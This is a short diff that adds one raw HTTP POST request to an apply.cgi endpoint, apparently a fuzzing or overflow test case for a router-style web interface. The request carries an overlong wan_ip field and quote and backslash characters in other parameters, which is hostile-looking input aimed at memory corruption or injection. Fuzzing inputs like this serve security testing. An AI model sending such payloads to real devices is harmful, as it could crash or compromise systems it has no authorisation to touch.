@@ -1,0 +1,6 @@
+POST /apply.cgi?qos_uplink_bandwidth HTTP/1.1
+Host: 86
+Content-Type: application/json
+Content-Length: 342
+
+wan_ip=aaaaaaaaaaaaaaaaaaaWZQwaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWZQwzaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&dns_ip=wzqwzqwzq&submit_flag=lan&%20timestamp=\wzq&filename='wzq&WzQ=wZQ
